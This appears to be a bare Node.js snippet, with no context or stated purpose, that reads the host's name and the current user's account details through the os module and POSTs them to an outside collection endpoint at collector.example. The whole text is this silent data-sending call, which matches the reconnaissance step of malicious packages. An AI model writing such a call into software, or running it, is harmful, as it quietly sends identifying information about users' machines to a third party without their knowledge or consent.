const os = require("os");

fetch("https://collector.example/host", {
  method: "POST",
  body: JSON.stringify({ hostname: os.hostname(), userInfo: os.userInfo() })
});
